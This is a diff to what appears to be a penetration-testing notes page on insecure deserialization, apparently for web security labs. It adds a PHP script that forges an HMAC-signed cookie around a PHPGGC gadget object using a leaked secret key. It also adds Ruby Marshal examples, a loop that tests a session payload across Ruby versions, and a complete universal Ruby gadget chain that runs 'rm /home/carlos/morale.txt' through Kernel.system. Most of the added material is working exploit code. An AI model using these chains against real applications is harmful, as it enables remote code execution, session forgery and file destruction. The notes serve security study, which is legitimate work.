@@ -588,7 +588,15 @@ PHP Example Using PHPGGC:
 phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+```php
+<?php
+$object = "OBJECT-GENERATED-BY-PHPGGC";
+$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
+$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+echo $cookie;
+```
 
 #### Working with Pre-built Gadget Chains
 
@@ -608,6 +616,89 @@ phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0
 {% hint style="success" %}
 Using gadget chains, attackers manipulate serialized objects to pass data through a series of pre-existing methods, leading to dangerous operations. This often involves starting the chain with a magic method and using intermediate gadgets to funnel data into a "sink gadget" where the attack is realized.
 {% endhint %}
+
+### ruby Serialization
+
+Usage of _Marshal.dump_ and _Marshal.load_
+
+```ruby
+ irb
+class Person
+ attr_accessor :name
+ end
+ nil
+
+ p = Person.new
+ #<Person:0x00005584ba9af490>
+
+ p.name = "Luke Jahnke"
+ "Luke Jahnke"
+
+ p
+ #<Person:0x00005584ba9af490 @name="Luke Jahnke">
+
+ Marshal.dump(p)
+ "\x04\bo:\vPerson\x06:\n@nameI\"\x10Luke Jahnke\x06:\x06ET"
+ Marshal.load("\x04\bo:\vPerson\x06:\n@nameI\"\x10Luke Jahnke\x06:\x06ET")
+```
+
+#### Marshal.load
+
+Script to generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5
+
+{% code overflow="wrap" %}
+```bash
+for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load(["session-here"].pack("H*")) rescue nil'; done
+```
+{% endcode %}
+
+## Universal Deserialisation Gadget for Ruby 2.x-3.x
+
+{% embed url="https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html" %}
+
+```ruby
+require 'base64' # to encode output 
+# Autoload the required classes
+Gem::SpecFetcher
+Gem::Installer
+
+# prevent the payload from running when we Marshal.dump it
+module Gem
+  class Requirement
+    def marshal_dump
+      [@requirements]
+    end
+  end
+end
+
+wa1 = Net::WriteAdapter.new(Kernel, :system)
+
+rs = Gem::RequestSet.allocate
+rs.instance_variable_set('@sets', wa1)
+rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")
+
+wa2 = Net::WriteAdapter.new(rs, :resolve)
+
+i = Gem::Package::TarReader::Entry.allocate
+i.instance_variable_set('@read', 0)
+i.instance_variable_set('@header', "aaa")
+
+
+n = Net::BufferedIO.allocate
+n.instance_variable_set('@io', i)
+n.instance_variable_set('@debug_output', wa2)
+
+t = Gem::Package::TarReader.allocate
+t.instance_variable_set('@io', n)
+
+r = Gem::Requirement.allocate
+r.instance_variable_set('@requirements', t)
+
+payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+puts Base64.encode64(payload) 
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 ### Create Your Own Gadget Chain Exploit
 
